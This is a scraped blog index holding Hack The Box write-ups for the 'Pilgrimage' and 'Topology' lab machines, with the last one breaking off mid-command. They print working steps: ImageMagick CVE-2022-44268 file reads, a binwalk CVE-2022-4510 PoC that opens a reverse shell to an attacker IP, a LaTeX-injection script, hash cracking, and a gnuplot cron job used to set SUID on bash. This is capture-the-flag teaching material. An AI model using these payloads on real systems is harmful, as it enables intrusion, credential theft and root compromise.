Pwned!!\nRelated Links # Server Side Template Injection - Payloads All The Things oss-security - firejail: local root exploit reachable via \u0026ndash;join logic (CVE-2022-31214) A Privilege Context Switching issue was discovered in\u0026hellip; · CVE-2022-31214 · GitHub Advisory Database https://www.openwall.com/lists/oss-security/2022/06/08/10/1 ","date":"27 November 2023","permalink":"/blog/htb-sandworm/","section":"Blog Posts","summary":"Sandworm is a medium linux box featuring a website with functionality for PGP operations, one of which is vulnerable to SSTI and leads to a restricted shell. Within the firejail environment, I discovered user credentials allowing me to pivot to a SSH shell. Next, I hijacked a cargo crate for command execution to get an unrestricted shell as the previous user. Finally, I exploit a vulnerable version of firejail to root privileges.","title":"HTB Sandworm"},{"content":"","date":null,"permalink":"/tags/library-hijack/","section":"Tags","summary":"","title":"Library-Hijack"},{"content":"","date":null,"permalink":"/tags/pgp/","section":"Tags","summary":"","title":"PGP"},{"content":"","date":null,"permalink":"/tags/restricted-shell/","section":"Tags","summary":"","title":"Restricted-Shell"},{"content":"","date":null,"permalink":"/tags/rust/","section":"Tags","summary":"","title":"Rust"},{"content":"","date":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"SSTI"},{"content":"","date":null,"permalink":"/tags/binwalk/","section":"Tags","summary":"","title":"Binwalk"},{"content":"","date":null,"permalink":"/tags/cve-2022-44268/","section":"Tags","summary":"","title":"CVE-2022-44268"},{"content":"","date":null,"permalink":"/tags/cve-2022-4510/","section":"Tags","summary":"","title":"CVE-2022-4510"},{"content":"","date":null,"permalink":"/tags/file-write/","section":"Tags","summary":"","title":"File-Write"},{"content":"","date":null,"permalink":"/tags/git-dumper/","section":"Tags","summary":"","title":"Git-Dumper"},{"content":"Pilgrimage HTB #Overview # Pilgrimage is an easy Linux box, featuring a website for image shrinking and a Git repository housing the website\u0026rsquo;s source code. Upon reviewing the source code, I found a vulnerable version of ImageMagick being used, susceptible to file retrieval. Leveraging this, I retrieved the website\u0026rsquo;s database, uncovering user credentials that were subsequently reused for SSH access. Next, a bash script executed by the root user used a vulnerable version of binwalk. I exploited the binwalk vulnerability to get root privileges.\nEnumeration # Open Ports #Found two open ports using nmap\nPort 22 is running OpenSSH. Port 80 hosts a Nginx web server. Moreover, the website on port 80 appears to be PHP-based and is also hosting a Git repository.\n#nmap -p22,80 -sV -sC -T4 -Pn -oA pilgrimage.htb pilgrimage.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 16:49 EDT Nmap scan report for pilgrimage.htb (10.129.111.11) Host is up (0.066s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 20be60d295f628c1b7e9e81706f168f3 (RSA) | 256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA) |_ 256 d14e293c708669b4d72cc80b486e9804 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Pilgrimage - Shrink Your Images | http-git: | 10.129.111.11:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: Pilgrimage image shrinking service initial commit. # Please ... |_http-server-header: nginx/1.18.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - pilgrimage.htb #The IP address redirects to pilgrimage.htb. The site at this address requires a PHP session cookie, indicating that PHP is likely part of the tech stack.\n\u0026gt; http -ph 10.129.111.11 HTTP/1.1 301 Moved Permanently Connection: keep-alive Content-Length: 169 Content-Type: text/html Date: Thu, 29 Jun 2023 20:43:38 GMT Location: http://pilgrimage.htb/ Server: nginx/1.18.0 \u0026gt; http -ph pilgrimage.htb HTTP/1.1 200 OK Cache-Control: no-store, no-cache, must-revalidate Connection: keep-alive Content-Encoding: gzip Content-Type: text/html; charset=UTF-8 Date: Thu, 29 Jun 2023 20:45:30 GMT Expires: Thu, 19 Nov 1981 08:52:00 GMT Pragma: no-cache Server: nginx/1.18.0 Set-Cookie: PHPSESSID=9ig5jqlpa70t2lop3id9s5g84q; path=/ Transfer-Encoding: chunked The pilgrimage.htb website appears to be an online image shrinker. However, access to the image shrinking functionality requires authentication. Fortunately, there is a registration functionality available.\nAfter logging in, I uploaded a test image, and the site returned a link to view the shrunken image. Unfortunately, there doesn\u0026rsquo;t seem to be anything significant in the modified image\u0026rsquo;s EXIF data.\nDirectory Enum #While, fuzzing the virtual host for hidden files and directories, I discovered a .git directory. This confirms the presence of a GIT repository.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://pilgrimage.htb/FUZZ -o ffuf_pilgrimage.md -of md -t 100 .git [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 62ms] .git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 66ms] .git/index [Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 66ms] .git/logs/ [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 66ms] .hta [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 68ms] .htpasswd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 69ms] .git/config [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 70ms] .htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 69ms] assets [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 63ms] index.php [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 64ms] tmp [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 64ms] vendor [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 62ms] Initial Foothold # I used the git-dumper script to download the Git repository. The repository appears to contain the source code for the website, including a magick directory, indicating that ImageMagick is used for the image shrinking functionality.\n\u0026gt; git-dumper http://pilgrimage.htb ./git_repo [-] Testing http://pilgrimage.htb/.git/HEAD [200] [-] Testing http://pilgrimage.htb/.git/ [403] [-] Fetching common files [-] Fetching http://pilgrimage.htb/.gitignore [404] [-] http://pilgrimage.htb/.gitignore responded with status code 404 [-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200] ...snip... ...snip... \u0026gt; cd git_repo \u0026gt; ls -la Permissions Size User Date Modified Name drwxr-xr-x - kali 29 Jun 16:59 .git drwxr-xr-x - kali 29 Jun 16:58 assets .rwxr-xr-x 5.5k kali 29 Jun 16:58 dashboard.php .rwxr-xr-x 9.2k kali 29 Jun 16:58 index.php .rwxr-xr-x 6.8k kali 29 Jun 16:58 login.php .rwxr-xr-x 98 kali 29 Jun 16:58 logout.php .rwxr-xr-x 28M kali 29 Jun 16:58 magick .rwxr-xr-x 6.8k kali 29 Jun 16:58 register.php drwxr-xr-x - kali 29 Jun 16:58 vendor The Git log contains only one commit, but it does provide a potential username: emily.\n* e1a40be - Wed, 7 Jun 2023 20:11:48 +1000 (3 weeks ago) (committed: Wed, 7 Jun 2023 20:11:48 +1000) (HEAD -\u0026gt; master) Pilgrimage image shrinking service initial commit. - emily \u0026lt;emily@pilgrimage.htb\u0026gt; (committer: root \u0026lt;root@pilgrimage.htb\u0026gt;) Source code review #This code snippet from login.php seems to be vulnerable to SQL injection. The username and password used in the SQLite query are taken directly from the POST data without any sanitization. It also shows the location of the SQLite database used, /var/db/pilgrimage.\nif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;]) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); $stmt = $db-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE username = ? and password = ?\u0026#34;); $stmt-\u0026gt;execute(array($username,$password)); The source code of index.php details the image upload process. Upon resizing the image using ImageMagick, if a valid user session is present, it stores the URL of the resized image along with the original image name in the database.\nif($upload) { $mime = \u0026#34;.png\u0026#34;; $imagePath = $upload-\u0026gt;getFullPath(); if(mime_content_type($imagePath) === \u0026#34;image/jpeg\u0026#34;) { $mime = \u0026#34;.jpeg\u0026#34;; } $newname = uniqid(); exec(\u0026#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\u0026#34; . $upload-\u0026gt;getName() . $mime . \u0026#34; -resize 50% /var/www/pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime); unlink($upload-\u0026gt;getFullPath()); $upload_path = \u0026#34;http://pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime; if(isset($_SESSION[\u0026#39;user\u0026#39;])) { $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); $stmt = $db-\u0026gt;prepare(\u0026#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)\u0026#34;); $stmt-\u0026gt;execute(array($upload_path,$_FILES[\u0026#34;toConvert\u0026#34;][\u0026#34;name\u0026#34;],$_SESSION[\u0026#39;user\u0026#39;])); } header(\u0026#34;Location: /?message=\u0026#34; . $upload_path . \u0026#34;\u0026amp;status=success\u0026#34;); } ImageMagick Information Disclosure #Manual #Additionally, the magick executable gives me the ImageMagick version being used for the resizing: 7.1.0-49 beta.\n\u0026gt; ./magick -version Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (7.5) While searching for exploits for the identified version of ImageMagick, I discovered an information disclosure vulnerability, CVE-2022-44268. In summary, if ImageMagick has permissions to read a specific file, this vulnerability allows embedding the content of that file in the result of an ImageMagick operation. The exploitation involves using a tEXt data chunk with the keyword profile, followed by the filename as a string. Then, ImageMagick interprets this string as a file to be loaded due to the FileToStringInfo method, potentially leading to the disclosure of sensitive information.\nI can use pngcrush to include the tEXt data and confirm its presence using exiftool. Subsequently, I uploaded the crafted image to Pilgrimage and retrieved the hex data from the Raw Profile Type tag of the resized image, effectively exploiting CVE-2022-44268.\n❯ convert -size 32x32 xc:white exploit.png ❯ pngcrush -text a \u0026#34;profile\u0026#34; \u0026#34;/etc/hostname\u0026#34; exploit.png Recompressing IDAT chunks in exploit.png to pngout.png Total length of data found in critical chunks = 72 Best pngcrush method = 1 (ws 11 fm 0 zl 4 zs 0) = 72 CPU time decode 0.001117, encode 0.001312, other 0.018197, total 0.021457 sec ❯ exiftool -profile pngout.png Profile : /etc/hostname ❯ exiftool \u0026#34;-*Profile*\u0026#34; 656346847a76b.png Raw Profile Type : .. 11.70696c6772696d6167650a. ❯ echo \u0026#39;70696c6772696d6167650a\u0026#39; | xxd -p -r pilgrimage Similarly, I can dump users with a login shell by querying the /etc/passwd file.\n❯ echo \u0026#39;726f6f743.....16c73650a\u0026#39; | xxd -r -p | grep sh$ root❌0:0:root:/root:/bin/bash emily❌1000:1000:emily,,,:/home/emily:/bin/bash Automated script #There is a publicly available automated rust PoC for CVE-2022-44268.\n\u0026gt; cargo run \u0026#34;/etc/passwd\u0026#34; Finished dev [unoptimized + debuginfo] target(s) in 0.05s Running `target/debug/cve-2022-44268 /etc/passwd` ❯ exiftool \u0026#34;-*Profile*\u0026#34; 649df80e3ce8d.png Raw Profile Type : .. 1437.726f6f743.....16c73650a. ❯ echo \u0026#39;726f6f743.....16c73650a\u0026#39; | xxd -r -p | grep sh$ root❌0:0:root:/root:/bin/bash emily❌1000:1000:emily,,,:/home/emily:/bin/bash SQLite Enum #Based on the the source code from the repository, I know that the database being used is located at /var/db/pilgrimage. Since this is also used for login, Leveraging the CVE, I can retrieved the SQLite database. ( CyberChef Recipe for the decoding the data )\n❯ pngcrush -text a \u0026#34;profile\u0026#34; \u0026#34;/var/db/pilgrimage\u0026#34; exploit.png\rRecompressing IDAT chunks in exploit.png to pngout.png\rTotal length of data found in critical chunks = 72\rBest pngcrush method = 1 (ws 11 fm 0 zl 4 zs 0) = 72\rCPU time decode 0.000218, encode 0.000548, other 0.005589, total 0.006840 sec\r❯ \u0026gt;....\r00000000000000000\u0026#39; | xxd -p -r \u0026gt; pilgrimage.sqlite\r❯ file pilgrimage.sqlite\rpilgrimage.sqlite: SQLite 3.x database, last written using SQLite version 3034001, file counter 75, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 75 Within the SQLite database, I found a user table that contains Emily\u0026rsquo;s password.\n\u0026gt; sqlite3 pilgrimage.sqlite SQLite version 3.40.1 2022-12-28 14:03:47 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .tables images users sqlite\u0026gt; select * from users; emily|abigchonkyboi123 abraxas|abraxas sqlite\u0026gt; SSH as emily #Given that there is a user named emily on the box, I attempted password reuse on SSH, and it was successful.\n\u0026gt; pc emily:abigchonkyboi123@pilgrimage.htb [17:48:40] Welcome to pwncat 🐈! __main__.py:164 [17:48:42] pilgrimage.htb:22: normalizing shell path manager.py:957 [17:48:43] pilgrimage.htb:22: registered new host w/ db manager.py:957 (local) pwncat$ (remote) emily@pilgrimage:/home/emily$ id uid=1000(emily) gid=1000(emily) groups=1000(emily) Vertical Privilege Escalation # Unfortunately, Emily\u0026rsquo;s account on the box does not have sudo privileges\n(remote) emily@pilgrimage:/home/emily$ sudo -l [sudo] password for emily: Sorry, user emily may not run sudo on pilgrimage. The pspy tool reveals background processes, including those initiated by other users such as root. This shows that a bash script named malwarescan.sh is being executed recurringly by the root user.\n2023/06/30 07:54:54 CMD: UID=0 PID=740 | /lib/systemd/systemd-logind 2023/06/30 07:54:54 CMD: UID=0 PID=736 | /bin/bash /usr/sbin/malwarescan.sh 2023/06/30 07:54:54 CMD: UID=0 PID=735 | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ The malwarescan.sh script appears to be a simple bash script intended to remove files from the /var/www/pilgrimage.htb/shrunk directory. The removal is conditional upon a blacklist condition checked by binwalk. Specifically, the script removes files if they are identified as Microsoft executables.\n(remote) emily@pilgrimage:/tmp$ ls -al /usr/sbin/malwarescan.sh -rwxr--r-- 1 root root 474 Jun 1 19:14 /usr/sbin/malwarescan.sh (remote) emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh #!/bin/bash blacklist=(\u0026#34;Executable script\u0026#34; \u0026#34;Microsoft executable\u0026#34;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\u0026#34;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \u0026#34;$FILE\u0026#34; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e \u0026#39;s/^.*CREATE //p\u0026#39;)\u0026#34; binout=\u0026#34;$(/usr/local/bin/binwalk -e \u0026#34;$filename\u0026#34;)\u0026#34; for banned in \u0026#34;${blacklist[@]}\u0026#34;; do if [[ \u0026#34;$binout\u0026#34; == *\u0026#34;$banned\u0026#34;* ]]; then /usr/bin/rm \u0026#34;$filename\u0026#34; break fi done done Binwalk command execution #I can get the version of binwalk being used via the help menu, Binwalk v2.3.2.\n(remote) emily@pilgrimage:/home/emily$ binwalk -h Binwalk v2.3.2 Craig Heffner, ReFirmLabs https://github.com/ReFirmLabs/binwalk Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ... Once again searching for exploits for Binwalk v2.3.2, I came across CVE-2022-4510. This vulnerability resulted from merging the PFS extractor plugin with binwalk and introduced a path traversal issue due to the use of os.path.join().Since PFS allows ../, binwalk can write to arbitrary directories, inturn allowing command execution. Interestingly, the solution to this vulnerability was to ensure the use of absolute paths (os.path.abspath()).\nThis CVE also has a public PoC that should give me a reverse shell. Running the python script creates a PNG image named binwalk_exploit.png.\n❯ convert -size 32x32 xc:white empty.png ❯ python binwalk_exploit.py empty.png 10.0.14.18 9005 ################################################ ------------------CVE-2022-4510---------------- ################################################ --------Binwalk Remote Command Execution-------- ------Binwalk 2.1.2b through 2.3.2 included----- ------------------------------------------------ ################################################ ----------Exploit by: Etienne Lacoche----------- ---------Contact Twitter: @electr0sm0g---------- ------------------Discovered by:---------------- ---------Q. Kaiser, ONEKEY Research Lab--------- ---------Exploit tested on debian 11------------ ################################################ You can now rename and share binwalk_exploit and start your local netcat listener. ❯ l Permissions Size User Date Modified Name .rw-r--r-- 753 abraxas 27 Jul 18:18 binwalk_exploit.png .rw-r--r-- 2.8k abraxas 27 Jul 18:18 binwalk_exploit.py .rw-r--r-- 72 abraxas 27 Jul 18:18 empty.png Uploading the newly crafted PNG file to the /var/www/pilgrimage.htb/shrunk directory.\n(remote) emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ (local) pwncat$ upload ../exploit/RCE/binwalk_exploit.png As soon as the cron job executes, I get a shell as the root user.\n\u0026gt; pc -lp 9005 [18:08:59] Welcome to pwncat 🐈! __main__.py:164 [18:23:50] received connection from 10.129.111.11:55858 bind.py:84 [18:23:52] 10.129.111.11:55858: registered new host w/ db manager.py:957 (local) pwncat$ (remote) root@pilgrimage:/root/quarantine# id uid=0(root) gid=0(root) groups=0(root) Pwned!!\nRelated Links # ImageMagick: The hidden vulnerability behind your online images - Metabase Q HackerOne | Report #1858574 - [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick | HackerOne possible DoS @ stdin (OCE-2022-70); possible arbitrary file leak (OCE… · ImageMagick/ImageMagick@05673e6 voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read Security Advisory: Remote Command Execution in binwalk - ONEKEY Serious security hole plugged in infosec tool binwalk | The Daily Swig Directory Traversal in binwalk | CVE-2022-4510 | Snyk CVE-2022-4510/RCE_Binwalk.py at main · electr0sm0g/CVE-2022-4510 ","date":"26 November 2023","permalink":"/blog/htb-pilgrimage/","section":"Blog Posts","summary":"Pilgrimage is an easy Linux box, featuring a website for image shrinking and a Git repository housing the website\u0026rsquo;s source code. Upon reviewing the source code, I found a vulnerable version of ImageMagick being used, susceptible to file retrieval. Leveraging this, I retrieved the website\u0026rsquo;s database, uncovering user credentials that were subsequently reused for SSH access. Next, a bash script executed by the root user used a vulnerable version of binwalk. I exploited the binwalk vulnerability to get root privileges.","title":"HTB Pilgrimage"},{"content":"","date":null,"permalink":"/tags/imagemagick/","section":"Tags","summary":"","title":"ImageMagick"},{"content":"","date":null,"permalink":"/tags/path-traversal/","section":"Tags","summary":"","title":"Path-Traversal"},{"content":"","date":null,"permalink":"/tags/gnuplot/","section":"Tags","summary":"","title":"Gnuplot"},{"content":"Topology HTB #Overview # Topology is an easy linux box featuring a web server with a vulnerable virtual host susceptible to LaTeX injection. This LaTeX injection allowed me to access and read files on the server, leading to the discovery of SSH login credentials. Lastly, I exploited a misconfiguration along with a functionality of gnuplot to execute system commands as the root user.\nEnumeration # Open Ports #I discovered two open port with nmap\nport 22 → Open SSH port 80 → Apache HTTP web server #nmap -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oN \u0026#34;nmap/fullScan_10.129.138.193.nmap\u0026#34; \u0026#34;10.129.138.193\u0026#34; Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 05:45 EDT Nmap scan report for 10.129.138.193 Host is up (0.063s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # nmap -Pn -p\u0026#34;22,80\u0026#34; -sV -sC -T4 -oA \u0026#34;nmap/10.129.138.193\u0026#34; \u0026#34;10.129.138.193\u0026#34; Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 05:46 EDT Nmap scan report for topology.htb (10.129.138.193) Host is up (0.075s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA) | 256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA) |_ 256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Miskatonic University | Topology Group Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #Unfortunately, the HTTP headers do not provide any valuable information.\n\u0026gt; http -ph 10.129.138.193 HTTP/1.1 200 OK Accept-Ranges: bytes Connection: Keep-Alive Content-Encoding: gzip Content-Length: 2246 Content-Type: text/html Date: Thu, 22 Jun 2023 09:51:28 GMT ETag: \u0026#34;1a6f-5f27900124a8b-gzip\u0026#34; Keep-Alive: timeout=5, max=100 Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding The website appears to be the homepage of a Topology Group within the Mathematics department of a university. There are references to a domain, topology.htb, in the professor\u0026rsquo;s email. The email format seems to follow the pattern of {FirstNameInitial}{LastName}. Additionally, there\u0026rsquo;s a project that includes an href linking to a new virtual host, latex.topology.htb.\nThe http://latex.topology.htb points to an index site containing mainly images, a few tex files, and an equation.php file. I also used wfuzz to search for other virtual hosts and found two more: dev and stats.\n\u0026gt; wfuzz_subdomain_enum topology.htb --hh 6767 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://topology.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 401 14 L 54 W 463 Ch \u0026#34;dev\u0026#34; 000000061: 200 5 L 9 W 108 Ch \u0026#34;stats\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4987 Requests/sec.: 0 stats.topology.htb #The dev virtual host doesn\u0026rsquo;t provide much; it just displays two images, and there\u0026rsquo;s no content at /files either.\n❯ http -pb stats.topology.htb \u0026lt;center\u0026gt; \u0026lt;p\u0026gt;\u0026lt;img src=\u0026#34;files/network.png\u0026#34; /\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;---\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;img src=\u0026#34;files/load.png\u0026#34; /\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/center\u0026gt; dev.topology.htb #The dev virtual host returns a 401 error, likely because it requires credentials for access.\n❯ http -ph dev.topology.htb HTTP/1.1 401 Unauthorized Connection: Keep-Alive Content-Length: 463 Content-Type: text/html; charset=iso-8859-1 Date: Sun, 29 Oct 2023 09:11:45 GMT Keep-Alive: timeout=5, max=100 Server: Apache/2.4.41 (Ubuntu) WWW-Authenticate: Basic realm=\u0026#34;Under construction\u0026#34; latex.topology.htb #I can input LaTeX content on this website, and it produces a PNG image of the equation. Unfortunately, I didn\u0026rsquo;t find any significant information in the EXIF data of the generated images. The website also specifies that it exclusively supports LaTeX one-liner inline math mode syntax.\nUsing the fractions LaTeX code, I can generate an image as shown in the output on the website.\nInitial Foothold # Looking for potential ways to exploit the LaTeX rendering feature came across a method known as LaTeX injection and a helpful blog post on the topic. To simplify the process, I\u0026rsquo;ve also wrote a Python script use the functionality via CLI.\n#!/usr/bin/env python import re import sys import requests import urllib3 import subprocess urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) payload = sys.argv[1] url = \u0026#34;http://latex.topology.htb/equation.php\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} # proxies = {\u0026#34;http\u0026#34;: \u0026#34;\u0026#34;} file_path = \u0026#34;output.png\u0026#34; params = {\u0026#34;eqn\u0026#34;: f\u0026#34;{payload}\u0026#34;, \u0026#34;submit\u0026#34;: \u0026#34;\u0026#34;} try: session = requests.Session() response = session.get(url=url, params=params, proxies=proxies) if response.status_code == 200 and response.content: image_data = response.content with open(file_path, \u0026#34;wb\u0026#34;) as file: file.write(image_data) print(f\u0026#34;Image downloaded and saved as \u0026#39;{file_path}\u0026#39;\u0026#34;) subprocess.run([\u0026#34;xdg-open\u0026#34;, file_path]) else: print(f\u0026#34;Failed to retrieve the image with code: {response.status_code}\u0026#34;) session.close() except Exception as e: print(f\u0026#34;Exception raised: {e}\u0026#34;) Using this script, I can replicate the previous image.\n❯ ./latex_injection.py \u0026#39;\\frac{x+5}{y-3}\u0026#39; Image downloaded and saved as \u0026#39;output.png\u0026#39; File read using latex injection #I attempted to use \\input{} to list the hostname, but it appears that it\u0026rsquo;s blacklisted or restricted.\n./latex_injection.py \u0026#39;\\input{/etc/hostname}\u0026#39; Image downloaded and saved as \u0026#39;output.png\u0026#39; The \\lstinputlisting{} syntax, although it returns a 200 status code, it contains null data. Multiline commands work, but they only return the first line of the file.\nSince the website requires inline math mode, according to the Overleaf documentation, which indicates that inline mode can be achieved by using the $...$ delimiters. Given that only lstinputlisting returned a 200 response, I combined this with the delimiters and was able to read the file contents.\nIn anticipation of working extensively with images, I modified the Python script to use Tesseract to extract and read the contents of the image.\n# pipenv install pytesseract pillow requests # sudo apt install tesseract-ocr import pytesseract from PIL import Image def extract_text_from_image(image_file): try: image = Image.open(image_file) text = pytesseract.image_to_string(image) print(text) except FileNotFoundError: print(f\u0026#34;Image file \u0026#39;{image_file}\u0026#39; not found.\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) And it works as expected !\n❯ pipenv run python latex_injection.py \u0026#39;$\\lstinputlisting{/etc/hostname}$\u0026#39; Image downloaded and saved as \u0026#39;output.png\u0026#39; topology I found another user with a login shell, named vdaisley in the /etc/passwd file.\n❯ pipenv run python latex_injection.py \u0026#39;$\\lstinputlisting{/etc/passwd}$\u0026#39; | grep sh$ root❌0:0: root:/root:/bin/bash vdaisley❌1007:1007: Vajramani Daisley ,W2 | —123,,:/home/ vdaisley :/ bin/bash Now that I can read file contents, and considering that the dev subdomain accepts credentials through Basic authentication, I have the potential to read its htaccess and htpasswd files located in the /var/www/dev/ directory.\n❯ pipenv run python latex_injection.py \u0026#39;$\\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$\u0026#39; | grep DocumentRoot DocumentRoot /var/www/html DocumentRoot /var/www/latex DocumentRoot /var/www/dev DocumentRoot /var/www/stats ❯ pipenv run python latex_injection.py \u0026#39;$\\lstinputlisting{/var/www/dev/.htaccess}$\u0026#39; Image downloaded and saved as \u0026#39;output.png\u0026#39; AuthName ”Under construction” AuthType Basic AuthUserFile /var/www/dev/. htpasswd Require valid—user The htpasswd file stores usernames and their corresponding passwords for basic authentication of HTTP users. These passwords are typically encrypted using md5crypt format.\n❯ pipenv run python latex_injection.py \u0026#39;$\\lstinputlisting{/var/www/dev/.htpasswd}$\u0026#39; Image downloaded and saved as \u0026#39;output.png\u0026#39; vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO I successfully cracked the hash using JTR and retrieved the credentials: vdaisley:calculus20. Using these credentials I can authenticate to the dev subdomain.\n\u0026gt; echo \u0026#39;vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO\u0026#39; \u0026gt; hash.txt ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status calculus20 (vdaisley) 1g 0:00:00:08 DONE (2023-10-29 23:27) 0.1234g/s 122927p/s 122927c/s 122927C/s calebd1..caitlyn09 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. ❯ john hash.txt --show vdaisley:calculus20 After authenticating with the cracked credentials on the dev virtual host, it seems to be an under-construction portfolio website with no other information.\nLuckily, the credentials are reused for SSH access and I can login as vdaisley.\n\u0026gt; pc vdaisley:calculus20@topology.htb [08:43:29] Welcome to pwncat 🐈! __main__.py:164 [08:43:32] topology.htb:22: registered new host w/ db manager.py:957 (local) pwncat$ (remote) vdaisley@topology:/home/vdaisley$ id uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley) (remote) vdaisley@topology:/home/vdaisley$ Privilege Escalation # Unfortunately, the user vdaisley doesn\u0026rsquo;t have any sudo privileges.\n(remote) vdaisley@topology:/home/vdaisley$ sudo -l [sudo] password for vdaisley: Sorry, user vdaisley may not run sudo on topology. I came across a directory named gnuplot in /opt owned by root. Interestingly, the directory has write permissions, but it doesn\u0026rsquo;t have read permissions for other users.\n(remote) vdaisley@topology:/home/vdaisley$ ls -la /opt/ total 12 drwxr-xr-x 3 root root 4096 May 19 13:04 . drwxr-xr-x 18 root root 4096 Jun 12 10:37 .. drwx-wx-wx 2 root root 4096 Jun 14 07:45 gnuplot Using pspy I discovered a cronjob running in the background. This cronjob seems to locate all files with the .plt extension within the /opt/gnuplot directory and subsequently executes them using the gnuplot utility.\n2023/06/22 08:55:01 CMD: UID=0 PID=22771 | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 2023/06/22 08:55:01 CMD: UID=0 PID=22772 | gnuplot /opt/gnuplot/loadplot.plt 2023/06/22 08:55:01 CMD: UID=0 PID=22776 | /bin/sh /opt/gnuplot/getdata.sh According to the gnuplot documentation, the system command can be used to execute system commands within gnuplot. Since I have write permissions to the /opt/gnuplot/ directory, I can write to files in that directory.\n(remote) vdaisley@topology:/opt$ echo \u0026#34;system \u0026#39;chmod u+s /bin/bash\u0026#39;\u0026#34; \u0026gt; /opt/gnuplot/privEsc.plt (remote) vdaisley@topology:/opt$ cat gnuplot/privEsc.plt system \u0026#39;chmod +s /bin/bash\u0026#39; (remote) 